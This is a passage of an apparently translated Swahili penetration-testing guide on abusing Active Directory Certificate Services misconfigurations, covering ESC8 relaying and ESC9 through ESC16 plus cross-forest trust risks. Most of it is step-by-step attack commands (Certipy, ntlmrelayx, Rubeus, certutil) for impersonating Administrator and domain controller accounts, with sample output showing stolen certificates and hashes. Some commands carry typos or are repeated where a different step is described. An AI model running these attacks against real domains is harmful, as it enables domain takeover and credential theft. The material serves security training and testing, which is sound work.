rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Matumizi mabaya na [Certipy](https://github.com/ly4k/Certipy)

Ombi la cheti linatolewa na Certipy kwa chaguo-msingi kulingana na template `Machine` au `User`, linaloamuliwa na ikiwa jina la akaunti linalorelay linamalizika kwa `$`. Ufafanuzi wa template mbadala unaweza kufikiwa kwa kutumia parameter `-template`.

Mbinu kama [PetitPotam](https://github.com/ly4k/PetitPotam) inaweza kisha kutumika kulazimisha uthibitishaji. Unapotegemea domain controllers, ufafanuzi wa `-template DomainController` unahitajika.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Hakuna Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Maelezo

Thamani mpya **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) kwa **`msPKI-Enrollment-Flag`**, inayojulikana kama ESC9, inazuia kuingizwa kwa **nyongeza mpya ya usalama `szOID_NTDS_CA_SECURITY_EXT`** katika cheti. Bendera hii inakuwa muhimu wakati `StrongCertificateBindingEnforcement` imewekwa kwa `1` (chaguo-msingi), tofauti na usanidi wa `2`. Umuhimu wake unaongezeka katika matukio ambapo ramu dhaifu ya cheti kwa Kerberos au Schannel inaweza kutumika kinyume (kama ilivyo kwa ESC10), kwani kutokuwepo kwa ESC9 hautabadili mahitaji.

Masharti ambapo usanidi wa bendera hii unakuwa muhimu ni pamoja na:

- `StrongCertificateBindingEnforcement` haijarekebishwa kuwa `2` (chaguo-msingi ni `1`), au `CertificateMappingMethods` inajumuisha bendera ya `UPN`.
- Cheti kimewekwa alama na bendera `CT_FLAG_NO_SECURITY_EXTENSION` ndani ya usanidi wa `msPKI-Enrollment-Flag`.
- EKU yoyote ya uthibitishaji wa mteja imeainishwa kwenye cheti.
- Ruhusa za `GenericWrite` zinapatikana juu ya akaunti yoyote ili kupata udhibiti wa akaunti nyingine.

### Mfano wa Matumizi Mabaya

Tuseme `John@corp.local` ana ruhusa za `GenericWrite` juu ya `Jane@corp.local`, akiwa na lengo la kudhoofisha `Administrator@corp.local`. Kiambatisho cha cheti cha `ESC9`, ambacho `Jane@corp.local` ana ruhusa ya kujiandikisha kwake, kimewekwa na bendera `CT_FLAG_NO_SECURITY_EXTENSION` katika usanidi wake wa `msPKI-Enrollment-Flag`.

Mwanzo, hash ya `Jane` inapatikana kwa kutumia Shadow Credentials, shukrani kwa `GenericWrite` ya `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Baadaye, `userPrincipalName` ya `Jane` imebadilishwa kuwa `Administrator`, kwa makusudi ikiacha sehemu ya domain `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Marekebisho haya hayavunji vizingiti, ikizingatiwa kuwa `Administrator@corp.local` bado ni tofauti kama `Administrator`'s `userPrincipalName`.

Baada ya hayo, template ya cheti `ESC9`, iliyotajwa kama dhaifu, imeombwa kama `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Imebainika kuwa `userPrincipalName` ya cheti inaonyesha `Administrator`, bila ya “object SID” yoyote.

`userPrincipalName` ya `Jane` kisha inarejeshwa kwa asili yake, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Kujaribu uthibitishaji kwa kutumia cheti kilichotolewa sasa kunaleta hash ya NT ya `Administrator@corp.local`. Amri lazima ijumuishe `-domain <domain>` kutokana na cheti kutokuwa na ufafanuzi wa domaini:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Ramani Dhaifu za Vyeti - ESC10

### Maelezo

Thamani mbili za registry kwenye domain controller zinatajwa na ESC10:

- Thamani ya default ya `CertificateMappingMethods` katika `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` ni `0x18` (`0x8 | 0x10`), kabla ilikuwa imewekwa kuwa `0x1F`.
- Mipangilio ya default ya `StrongCertificateBindingEnforcement` katika `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` ni `1`, kabla ni `0`.

**Kesi 1**

Wakati `StrongCertificateBindingEnforcement` imewekwa kama `0`.

**Kesi 2**

Ikiwa `CertificateMappingMethods` inajumuisha bit ya `UPN` (`0x4`).

### Mfano wa Matumizi Mabaya 1

Ikiwa `StrongCertificateBindingEnforcement` imewekwa kama `0`, akaunti A yenye ruhusa za `GenericWrite` inaweza kutumiwa ili compromise akaunti yoyote B.

Kwa mfano, akiwa na ruhusa za `GenericWrite` juu ya `Jane@corp.local`, mshambuliaji analenga compromise `Administrator@corp.local`. Utaratibu unaendana na ESC9, ukiruhusu any certificate template kutumika.

Mwanzo, hash ya `Jane` inapatikana kwa kutumia Shadow Credentials, ikitumia `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Baadaye, `Jane`'s `userPrincipalName` inabadilishwa kuwa `Administrator`, kwa makusudi kuondoa sehemu ya `@corp.local` ili kuepuka ukiukaji wa vigezo.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Baada ya hili, cheti kinachowezesha uthibitishaji wa mteja kinaombwa kwa jina la `Jane`, kwa kutumia kiolezo cha chaguo-msingi `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` ya `Jane` kisha inarudishwa kwa thamani yake ya awali, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Kuthibitisha kwa kutumia certificate iliyopatikana kutatoa NT hash ya `Administrator@corp.local`, hivyo lazima utaje domain kwenye amri kwa sababu certificate haina maelezo ya domain.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Kesi ya Matumizi Mbaya 2

Ikiwa `CertificateMappingMethods` ina flag ya bit ya `UPN` (`0x4`), akaunti A yenye ruhusa za `GenericWrite` inaweza kupata udhibiti wa akaunti yoyote B isiyo na mali ya `userPrincipalName`, ikiwa ni pamoja na akaunti za mashine na msimamizi wa domain aliyejengwa ndani `Administrator`.

Hapa, lengo ni kupata udhibiti wa `DC$@corp.local`, kuanza kwa kupata hash ya `Jane` kupitia Shadow Credentials, kwa kutumia `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` ya `Jane` kisha imewekwa kuwa `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Cheti kwa ajili ya uthibitisho wa mteja kimeombwa kama `Jane` kwa kutumia kiolezo la chaguo-msingi `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` ya `Jane` inarudishwa kwenye hali yake ya awali baada ya mchakato huu.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Ili kuthibitisha kupitia Schannel, chaguo la Certipy `-ldap-shell` linatumika, likionyesha mafanikio ya uthibitishaji kama `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Kupitia LDAP shell, amri kama `set_rbcd` zinawezesha mashambulizi ya Resource-Based Constrained Delegation (RBCD), na zinaweza kuhatarisha usalama wa domain controller.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Uraha huu pia unahusisha akaunti yoyote ya mtumiaji isiyokuwa na `userPrincipalName` au ambapo haifananishi na `sAMAccountName`, huku `Administrator@corp.local` ya chaguo-msingi ikiwa lengwa kuu kutokana na vibali vyake vya LDAP vilivyo juu na ukosefu wa `userPrincipalName` kwa chaguo-msingi.

## Relaying NTLM to ICPR - ESC11

### Maelezo

Ikiwa CA Server haijasanidiwa na `IF_ENFORCEENCRYPTICERTREQUEST`, inaweza kuwezesha mashambulizi ya relay ya NTLM bila kusaini kupitia huduma ya RPC. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Unaweza kutumia `certipy` kuorodhesha ikiwa `Enforce Encryption for Requests` imezimwa na certipy itaonyesha `ESC11` Vulnerabilities.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Abuse Scenario

Inahitaji kusanidi relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Kumbuka: Kwa domain controllers, tunapaswa kubainisha `-template` katika DomainController.

Au kutumia [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Ufikiaji wa shell kwa ADCS CA na YubiHSM - ESC12

### Maelezo

Wasimamizi wanaweza kusanidi Mamlaka ya Cheti (Certificate Authority) ili kuihifadhi kwenye kifaa cha nje kama "Yubico YubiHSM2".

If USB device connected to the CA server via a USB port, or a USB device server in case of the CA server is a virtual machine, an authentication key (sometimes referred to as a "password") is required for the Key Storage Provider to generate and utilize keys in the YubiHSM.

Hili funguo/"password" limehifadhiwa kwenye registry chini ya `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` kwa maandishi wazi.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Muktadha wa Matumizi Mabaya

If the CA's private key stored on a physical USB device when you got a shell access, it is possible to recover the key.

Kwanza, unahitaji kupata cheti cha CA (hiki ni cha umma) kisha:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Mwishowe, tumia amri ya certutil `-sign` kutengeneza cheti kipya chochote kwa kutumia cheti cha CA na ufunguo wake wa kibinafsi.

## OID Group Link Abuse - ESC13

### Maelezo

The `msPKI-Certificate-Policy` attribute allows the issuance policy to be added to the certificate template. The `msPKI-Enterprise-Oid` objects that are responsible for issuing policies can be discovered in the Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) of the PKI OID container. A policy can be linked to an AD group using this object's `msDS-OIDToGroupLink` attribute, enabling a system to authorize a user who presents the certificate as though he were a member of the group. [Marejeo hapa](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Kwa maneno mengine, mtumiaji akiwa na ruhusa ya kusajili cheti na cheti hicho kikiwa kimeunganishwa na kundi la OID, mtumiaji anaweza kurithi ruhusa za kundi hilo.

Tumia [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) kutafuta OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Senario ya Matumizi Mabaya

Tafuta ruhusa ya mtumiaji kwa kutumia `certipy find` au `Certify.exe find /showAllPermissions`.

Ikiwa `John` ana ruhusa ya kujiandikisha kwenye `VulnerableTemplate`, mtumiaji anaweza kurithi haki za kikundi `VulnerableGroup`.

Yote inahitaji kufanya ni kutaja template; mtumiaji atapata cheti chenye haki za OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Mipangilio Dhaifu ya Upyaji wa Cheti - ESC14

### Maelezo

Maelezo katika https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping ni ya kina sana. Hapa chini ni nukuu ya maandishi ya awali.

ESC14 inashughulikia udhaifu unaotokana na "weak explicit certificate mapping", hasa kupitia matumizi mabaya au usanidi usio salama wa sifa ya `altSecurityIdentities` kwenye akaunti za watumiaji au kompyuta za Active Directory. Sifa hii yenye thamani nyingi inaruhusu wasimamizi kuhusisha kwa mikono vyeti vya X.509 na akaunti ya AD kwa madhumuni ya uthibitishaji. Wakati imejazwa, ramani hizi za wazi zinaweza kuimarisha mantiki ya ramani ya chaguo-msingi ya cheti, ambayo kawaida hutegemea UPNs au majina ya DNS kwenye SAN ya cheti, au SID iliyowekwa ndani ya nyongeza ya usalama `szOID_NTDS_CA_SECURITY_EXT`.

"Ramani dhaifu" hutokea pale thamani ya kamba inayotumiwa ndani ya sifa ya `altSecurityIdentities` kutambua cheti ni pana mno, rahisi kukisia, inategemea mashamba yasiyo ya kipekee ya cheti, au inatumia vipengele vya cheti vinavyoweza kuiga kwa urahisi. Ikiwa mshambuliaji anaweza kupata au kutengeneza cheti ambacho sifa zake zinakidhi ramani iliyofafanuliwa vibaya kwa akaunti yenye hadhi ya juu, anaweza kutumia cheti hicho kuthibitisha na kujisifu kuwa ni akaunti hiyo.

Mifano ya kamba za ramani za `altSecurityIdentities` zinazoweza kuwa dhaifu ni pamoja na:

- Mapping solely by a common Subject Common Name (CN): e.g., `X509:<S>CN=SomeUser`. Mshambuliaji anaweza kupata cheti chenye CN hii kutoka kwa chanzo chenye usalama mdogo.
- Using overly generic Issuer Distinguished Names (DNs) or Subject DNs without further qualification like a specific serial number or subject key identifier: e.g., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Employing other predictable patterns or non-cryptographic identifiers that an attacker might be able to satisfy in a certificate they can legitimately obtain or forge (if they have compromised a CA or found a vulnerable template like in ESC1).

Sifa ya `altSecurityIdentities` inaunga mkono fomati mbalimbali za ramani, kama vile:

- `X509:<I>IssuerDN<S>SubjectDN` (maps by full Issuer and Subject DN)
- `X509:<SKI>SubjectKeyIdentifier` (maps by the certificate's Subject Key Identifier extension value)
- `X509:<SR>SerialNumberBackedByIssuerDN` (maps by serial number, implicitly qualified by the Issuer DN) - this is not a standard format, usually it's `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (maps by an RFC822 name, typically an email address, from the SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (maps by a SHA1 hash of the certificate's raw public key - generally strong)

Usalama wa ramani hizi unategemea sana ufafanuzi, upekee, na nguvu ya kimsingi ya kriptografia ya kitambulisho cha cheti kilichochaguliwa katika kamba ya ramani. Hata pale hatua kali za kufunga cheti zinapowashwa kwenye Domain Controllers (ambazo hasa zinaathiri ramani zisizo wazi zenye msingi kwenye SAN UPNs/DNS na nyongeza ya SID), kipengele cha `altSecurityIdentities` kilicho sanidiwa vibaya bado kinaweza kutoa njia ya moja kwa moja ya kujisifu ikiwa mantiki ya ramani yenyewe ni dhaifu au mpana kupita kiasi.

### Skenario ya Matumizi Mabaya

ESC14 inalenga **explicit certificate mappings** katika Active Directory (AD), hasa sifa ya `altSecurityIdentities`. Ikiwa sifa hii imewekwa (kulingana na muundo au kutokana na usanidi mbaya), washambuliaji wanaweza kujisifu kwa akaunti kwa kuonyesha vyeti vinavyolingana na ramani.

#### Skenario A: Mshambuliaji Anaweza Kuandika kwenye `altSecurityIdentities`

**Masharti ya awali**: Mshambuliaji ana ruhusa ya kuandika kwenye sifa ya `altSecurityIdentities` ya akaunti lengwa au ruhusa ya kuipatia kwa njia ya mojawapo ya ruhusa zifuatazo kwenye kitu lengwa cha AD:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Skenario B: Lengo Lina Ramani Dhaifu kupitia X509RFC822 (Email)

- **Masharti ya awali**: Lengo lina ramani dhaifu ya X509RFC822 katika `altSecurityIdentities`. Mshambuliaji anaweza kuweka sifa ya barua (`mail`) ya mwathirika ili iendane na jina la X509RFC822 la lengo, kujiandikisha cheti kama mwathirika, kisha kutumia cheti hicho kuthibitisha kama lengo.

#### Skenario C: Lengo Lina X509IssuerSubject Mapping

- **Masharti ya awali**: Lengo lina ramani dhaifu ya X509IssuerSubject iliyo wazi katika `altSecurityIdentities`. Mshambuliaji anaweza kuweka sifa ya `cn` au `dNSHostName` kwenye msimamizi wa mwathirika ili iendane na subject ya ramani ya X509IssuerSubject ya lengo. Kisha, mshambuliaji anaweza kujiandikisha cheti kama mwathirika, na kutumia cheti hicho kuthibitisha kama lengo.

#### Skenario D: Lengo Lina X509SubjectOnly Mapping

- **Masharti ya awali**: Lengo lina ramani dhaifu ya X509SubjectOnly iliyo wazi katika `altSecurityIdentities`. Mshambuliaji anaweza kuweka sifa ya `cn` au `dNSHostName` kwenye msimamizi wa mwathirika ili iendane na subject ya ramani ya X509SubjectOnly ya lengo. Kisha, mshambuliaji anaweza kujiandikisha cheti kama mwathirika, na kutumia cheti hicho kuthibitisha kama lengo.

### Operesheni za Vitendo

#### Skenario A

Omba cheti kwa kutumia template ya cheti `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Hifadhi na ubadilishe cheti
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Thibitisha (ukitumia cheti)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Usafishaji (hiari)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Kwa mbinu maalum zaidi za mashambulizi katika matukio mbalimbali ya shambulizi, rejea yafuatayo: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Sera za Maombi(CVE-2024-49019) - ESC15

### Maelezo

Maelezo kwenye https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc ni ya kina sana. Chini ni nukuu ya maandishi ya asili.

Kwa kutumia template za vyeti za chaguo-msingi zinazojengwa za toleo 1, mshambuliaji anaweza kutengeneza CSR ili kujumuisha application policies ambazo zinapendekezwa zaidi kuliko configured Extended Key Usage attributes zilizobainishwa kwenye template. Sharti pekee ni enrollment rights, na inaweza kutumika kuunda client authentication, certificate request agent, na codesigning certificates kwa kutumia template ya **_WebServer_**.

### Abuse

Mafuatayo yanarejea [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu), Bonyeza kuona mbinu za matumizi za kina.

Amri ya Certipy's `find` inaweza kusaidia kutambua V1 templates ambazo zinaweza kuwa nyeti kwa ESC15 ikiwa CA haijarekebishwa.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Senario A: Kuiga moja kwa moja kupitia Schannel

**Hatua 1: Omba cheti, ukiingiza "Client Authentication" Application Policy na UPN lengwa.** Mshambulizi `attacker@corp.local` analenga `administrator@corp.local` akitumia template ya "WebServer" V1 (ambayo inaruhusu subject inayotolewa na aliyejisajili).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Template dhaifu ya V1 yenye "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Hufyonza OID `1.3.6.1.5.5.7.3.2` kwenye extension ya Application Policies ya CSR.
- `-upn 'administrator@corp.local'`: Inaweka UPN katika SAN kwa ajili ya impersonation.

**Hatua ya 2: Thibitisha kwa Schannel (LDAPS) ukitumia cheti kilichopatikana.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Mfano B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Hatua 1: Omba cheti kutoka kwa V1 template (with "Enrollee supplies subject"), ukiingiza "Certificate Request Agent" Application Policy.** Cheti hiki ni kwa ajili ya mshambuliaji (`attacker@corp.local`) kuwa enrollment agent. Hakuna UPN iliyotajwa kwa utambulisho wa mshambuliaji hapa, kwani lengo ni uwezo wa agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Inaingiza OID `1.3.6.1.4.1.311.20.2.1`.

**Hatua ya 2: Tumia cheti cha "agent" kuomba cheti kwa niaba ya mtumiaji mwenye ruhusa za juu anayelengwa.** Hii ni hatua inayofanana na ESC3, ikitumia cheti kutoka Hatua ya 1 kama cheti cha "agent".
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Hatua ya 3: Thibitisha kama mtumiaji mwenye ruhusa kwa kutumia cheti cha "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Explanation

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** inarejelea hali ambapo, ikiwa usanidi wa AD CS hauhitaji ujumuishaji wa kiendelezo cha **szOID_NTDS_CA_SECURITY_EXT** katika vyeti vyote, mshambuliaji anaweza kuchukua fursa ya hili kwa:

1. Kuomba cheti **bila SID binding**.

2. Kutumia cheti hiki **kwa uthibitisho kama akaunti yoyote**, kama kuiga akaunti yenye ruhusa za juu (mf., Domain Administrator).

Unaweza pia kurejea makala hii kujifunza zaidi kuhusu kanuni za kina:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Abuse

Yafuatayo yanarejelea [this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Bonyeza ili kuona mbinu za matumizi kwa undani.

Ili kubaini kama mazingira ya Active Directory Certificate Services (AD CS) yanaweza kuwa dhaifu kwa **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Hatua 1: Soma UPN ya awali ya akaunti ya mwathirika (Hiari - kwa ajili ya urejeshaji).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Hatua ya 2: Sasisha UPN ya akaunti ya mwathiri ili kuwa `sAMAccountName` ya msimamizi lengwa.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Hatua ya 3: (Ikiwa inahitajika) Pata credentials za akaunti ya "victim" (kwa mfano, kupitia Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Hatua ya 4: Omba cheti kama mtumiaji "victim" kutoka _kiolezo chochote kinachofaa cha uthibitishaji wa mteja_ (mfano, "User") kwenye CA iliyoathiriwa na ESC16.** Kwa sababu CA imeathiriwa na ESC16, itaitoa kwa otomatiki SID security extension kutoka kwenye cheti kilichotolewa, bila kuzingatia mipangilio maalum ya kiolezo kwa nyongeza hii. Weka variable ya mazingira ya cache ya vithibitisho vya Kerberos (shell command):
```bash
export KRB5CCNAME=victim.ccache
```
Kisha omba cheti:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Hatua ya 5: Rudisha UPN ya akaunti ya "victim".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Hatua ya 6: Thibitisha kama msimamizi lengwa.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Kufichua Misitu kwa Kutumia Vyeti Kimeelezewa kwa Sauti Isiyoamsha

### Kuvunjwa kwa Trusts za Forest kutokana na CA zilizo compromised

Usanidi wa **cross-forest enrollment** umefanywa kuwa rahisi. **root CA certificate** kutoka kwa resource forest hutangazwa kwa account forests na wasimamizi, na **enterprise CA** certificates kutoka resource forest zinaongezwa kwenye `NTAuthCertificates` na AIA containers katika kila account forest. Kwa ufafanuzi, mpangilio huu unampa **CA in the resource forest complete control** juu ya misitu mingine yote ambayo inasimamia PKI. Ikiwa CA hii itadukuliwa na wadukuzi, vyeti vya watumiaji wote katika resource na account forests vinaweza **forged by them**, na hivyo kuvunja mpaka wa usalama wa forest.

### Haki za Enrollment Zilizotolewa kwa Foreign Principals

Katika mazingira ya multi-forest, tahadhari inahitajika kuhusu Enterprise CAs ambazo **publish certificate templates** ambazo zinamruhusu **Authenticated Users or foreign principals** (watumiaji/vikundi nje ya forest ambayo Enterprise CA inamiliki) **enrollment and edit rights**.\
Baada ya authentication kupitia trust, **Authenticated Users SID** inaongezwa kwenye token ya mtumiaji na AD. Hivyo, ikiwa domain ina Enterprise CA yenye template ambayo **allows Authenticated Users enrollment rights**, template inaweza kuweza **be enrolled in by a user from a different forest**. Vivyo hivyo, ikiwa **enrollment rights are explicitly granted to a foreign principal by a template**, **cross-forest access-control relationship is thereby created**, ikiruhusu principal kutoka forest moja **enroll in a template from another forest**.

Matukio yote mawili huleta **increase in the attack surface** kutoka forest moja hadi nyingine. Mipangilio ya certificate template inaweza kutumiwa na mwashambulizi kupata ruhusa za ziada katika domain ya kigeni.


## References

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
